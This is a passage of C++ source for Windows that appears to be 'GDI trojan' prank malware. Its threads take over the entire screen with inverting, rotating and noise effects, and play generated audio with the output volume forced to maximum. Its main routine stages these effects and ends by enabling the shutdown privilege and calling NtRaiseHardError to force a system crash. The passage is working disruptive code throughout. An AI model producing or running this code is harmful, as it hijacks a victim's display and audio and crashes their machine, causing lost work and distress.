			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };
			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(65535, 65535));

			Sleep(1000 * 31);
		}

		return 0x00;
	}
	DWORD WINAPI decrescent(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD dx = 0;

		DWORD c = 0;

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				if (c == 100000)
				{
					c = 0;
				}

				DWORD offset = c + 17000;

				double freq = (8 * sizeof(sbuffer)) / offset;

				sbuffer[t] = Math::SineWave(freq, 2, offset, 4000);
				sbuffer[t] *= 3;

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}
	DWORD WINAPI ellipses(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;

		//semi-major axis and semi-minor axis
		FLOAT a = 5.0;
		FLOAT b = 3.0;

		SetStretchBltMode(dc, COLORONCOLOR);
		SetStretchBltMode(dcCopy, COLORONCOLOR);

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			//Set a random (x,y) pos
			int randx = rand() % ws;
			int randy = rand() % hs;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = x - randx;
					int cy = y - randy;

					//(x²/a²) + (y²+b²) = 1
					int zx = (cx * cx) / (a * a);
					int zy = (cy * cy) / (b * b);

					//Plasma it
					int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

					//Convert the screen colors to HSV
					HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

					//Apply the effect from fx+i [0,360]
					hsv.h = fmod(fx + i, 360.0);

					//Return the HSV back to RGB and show it
					rgbquad[index] = Colors::HSVtoRGB(hsv);
				}
			}

			i++;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 1000);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}
	DWORD WINAPI xorroto(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;
		DOUBLE angle = 0.f;

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					//CenterX and CenterY
					int cx = (x - (ws / 2));
					int cy = (y - (hs / 2));

					//2D Rotating Matrix
					int zx = cos(angle) * cx - sin(angle) * cy;
					int zy = sin(angle) * cx + cos(angle) * cy;

					//XOR Pattern
					int fx = (zx + i) ^ (zy + i);

					rgbquad[index].rgbRed += fx;
					rgbquad[index].rgbGreen += fx;
					rgbquad[index].rgbBlue += fx;
				}
			}

			i++; angle += 0.01f;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 10);
			System::RedrawScreen();

			if (rand() % 25 == 0 && random)
			{
				Sleep(1000);
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}
	DWORD WINAPI patblt(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(NULL);
        int w = GetSystemMetrics(SM_CXSCREEN),
            h = GetSystemMetrics(SM_CYSCREEN);

        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        PatBlt(hdc, 0, 0, w, h, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(NULL, hdc);
    }
}
DWORD WINAPI halftone(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;
		DOUBLE angle = 0.f;

		//Just added a HALFTONE effect
		SetStretchBltMode(dcCopy, HALFTONE);
		SetStretchBltMode(dc, HALFTONE);

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = abs(x - (ws / 2));
					int cy = abs(y - (hs / 2));

					int zx = cos(angle) * cx - sin(angle) * cy;
					int zy = sin(angle) * cx + cos(angle) * cy;

					int fx = (zx + i) ^ (zy + i);

					rgbquad[index].rgbRed += fx;
					rgbquad[index].rgbGreen += fx;
					rgbquad[index].rgbBlue += fx;
				}
			}

			i++; angle += 0.01f;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 10);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}
DWORD WINAPI Exp(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD c = 0;

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				//if (c == 900000)
				//{
					//c = 0;
				//}

				double wave = Math::SineWave(1, c * 0.0011, (c & 32767), wfx.nSamplesPerSec * 2);

				sbuffer[t] = (int(wave * 0xA) & 0xFFFF);

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}
DWORD WINAPI finalshitlmao(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		int color = 0;

		bool statementA = true;
		bool statementB = true;

		while (1)
		{
			SetStretchBltMode(dc, COLORONCOLOR);
			SetStretchBltMode(dcCopy, COLORONCOLOR);

			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, h, w, 0, SRCCOPY);

			int r = rand() % 0xFF;
			int g = rand() % 0xFF;
			int b = rand() % 0xFF;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					int noise = rand() % 0xFF;

					noise %= (r * g * b + 1) % (color + 1) + 1;

					/*
						   Kinda same from BitColors();
						The difference is that it doesn't
						     Sum the noise to itself
					*/

					rgbquad[index].rgbRed = noise + r;
					rgbquad[index].rgbGreen = noise + g;
					rgbquad[index].rgbBlue = noise + b;
				}
			}

			if (statementA)
			{
				color++;

				if (color > 0xAA)
				{
					statementA = false;
					statementB = true;
				}
			}

			if (statementB)
			{
				color--;

				if (color == 0)
				{
					statementA = true;
					statementB = false;
				}
			}

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
		}

		return 0x00;
	}
	int main() {
		HANDLE thread0 = CreateThread(0, 0, alpha, 0, 0, 0);
		HANDLE thread1 = CreateThread(0, 0, messlabels, 0, 0, 0);
		Sleep(20000);
		HANDLE thread12 = CreateThread(0, 0, shake1, 0, 0, 0);
	    Sleep(40000);
	    HANDLE thread3 = CreateThread(0, 0, beta, 0, 0, 0);
		HANDLE thread4 = CreateThread(0, 0, waves, 0, 0, 0);
		Sleep(20000);
		HANDLE thread5 = CreateThread(0, 0, texts, 0, 0, 0);
		Sleep(70000);
		HANDLE thread6 = CreateThread(0, 0, gamma, 0, 0, 0);
		HANDLE thread7 = CreateThread(0, 0, bit, 0, 0, 0);
		Sleep(15000);
		TerminateThread(thread0, 0);
	    CloseHandle(thread0);
	    TerminateThread(thread1, 0);
	    CloseHandle(thread1);
	    TerminateThread(thread3, 0);
	    CloseHandle(thread3);
	    TerminateThread(thread4, 0);
	    CloseHandle(thread4);
	    TerminateThread(thread5, 0);
	    CloseHandle(thread5);
	    TerminateThread(thread6, 0);
	    CloseHandle(thread6);
	    TerminateThread(thread7, 0);
	    CloseHandle(thread7);
	    TerminateThread(thread12, 0);
	    CloseHandle(thread12);
		HANDLE thread8 = CreateThread(0, 0, A, 0, 0, 0);
		HANDLE thread21 = CreateThread(0, 0, patblt, 0, 0, 0);
		HANDLE thread9 = CreateThread(0, 0, kaleidoscope, 0, 0, 0);
		Sleep(20000);
	    TerminateThread(thread8, 0);
	    CloseHandle(thread8);
	    TerminateThread(thread9, 0);
	    CloseHandle(thread9);
	    TerminateThread(thread21, 0);
	    CloseHandle(thread21);
	    HANDLE thread10 = CreateThread(0, 0, B, 0, 0, 0);
	    HANDLE thread15 = CreateThread(0, 0, center, 0, 0, 0);
		HANDLE thread11 = CreateThread(0, 0, ithinkthisisthecube, 0, 0, 0);
		Sleep(30000);
		TerminateThread(thread10, 0);
	    CloseHandle(thread10);
	    TerminateThread(thread15, 0);
	    CloseHandle(thread15);
		HANDLE thread13 = CreateThread(0, 0, C, 0, 0, 0);
	    HANDLE thread14 = CreateThread(0, 0, strips, 0, 0, 0);
	    Sleep(20000);
	    TerminateThread(thread11, 0);
	    CloseHandle(thread11);
	    TerminateThread(thread13, 0);
	    CloseHandle(thread13);
	    TerminateThread(thread14, 0);
	    CloseHandle(thread14);
	    RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
	    HANDLE thread16 = CreateThread(0, 0, snd2, 0, 0, 0);
	    HANDLE thread17 = CreateThread(0, 0, shake1, 0, 0, 0);
	    shakeIntensity = 10;
	    Sleep(10000);
	    HANDLE thread19 = CreateThread(0, 0, ellipses, 0, 0, 0);
	    Sleep(22000);
	    HANDLE thread20 = CreateThread(0, 0, kaleidoscope, 0, 0, 0);
	    HANDLE thread18 = CreateThread(0, 0, decrescent, 0, 0, 0);
	    HANDLE thread23 = CreateThread(0, 0, patblt, 0, 0, 0);
	    Sleep(10000);
	    HANDLE thread22 = CreateThread(0, 0, shake1, 0, 0, 0);
	    Sleep(20000);
	    HANDLE thread24 = CreateThread(0, 0, halftone, 0, 0, 0);
	    HANDLE thread25 = CreateThread(0, 0, texts, 0, 0, 0);
	    HANDLE thread26 = CreateThread(0, 0, bit, 0, 0, 0);
	    HANDLE thread28 = CreateThread(0, 0, Exp, 0, 0, 0);
	    Sleep(9000);
	    HANDLE thread27 = CreateThread(0, 0, center, 0, 0, 0);
	    Sleep(20000);
	    	    TerminateThread(thread16, 0);
	    CloseHandle(thread16);
	    TerminateThread(thread17, 0);
	    CloseHandle(thread17);
	    TerminateThread(thread18, 0);
	    CloseHandle(thread18);
	    TerminateThread(thread19, 0);
	    CloseHandle(thread19);
	    TerminateThread(thread20, 0);
	    CloseHandle(thread20);
	    TerminateThread(thread21, 0);
	    CloseHandle(thread21);
	    TerminateThread(thread22, 0);
	    CloseHandle(thread22);
	    TerminateThread(thread24, 0);
	    CloseHandle(thread24);
	    TerminateThread(thread25, 0);
	    CloseHandle(thread25);
	    TerminateThread(thread26, 0);
	    CloseHandle(thread26);
	    TerminateThread(thread27, 0);
	    CloseHandle(thread27);
	    HANDLE thread29 = CreateThread(0, 0, finalshitlmao, 0, 0, 0);
	    HANDLE thread67 = CreateThread(0, 0, noise, 0, 0, 0);
	    Sleep(20000);
	    TerminateThread(thread29, 0);
	    CloseHandle(thread29);
	    TerminateThread(thread67, 0);
	    CloseHandle(thread67);
	    	BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(0xC0000145, 0, 0, 0, 6, &response);
			Sleep(-1);
}

